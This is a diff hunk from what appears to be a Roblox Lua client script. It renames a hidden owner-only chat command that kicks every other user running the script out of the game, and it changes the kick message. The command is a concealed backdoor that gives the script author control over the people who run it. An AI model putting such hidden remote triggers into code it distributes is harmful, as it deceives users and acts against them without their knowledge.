@@ -6175,9 +6175,9 @@ task.spawn(function()
 
 		for i, v in next, PlayerService:GetPlayers() do
 			v.Chatted:Connect(function(Message)				
-				if Message:lower() == "!kick alluser" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!sigma alluser" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
-						LocalPlayer:Kick("Kicked by script owner")
+						LocalPlayer:Kick("Kicked by script owner | the Sigma")
 					end)
 				end
 
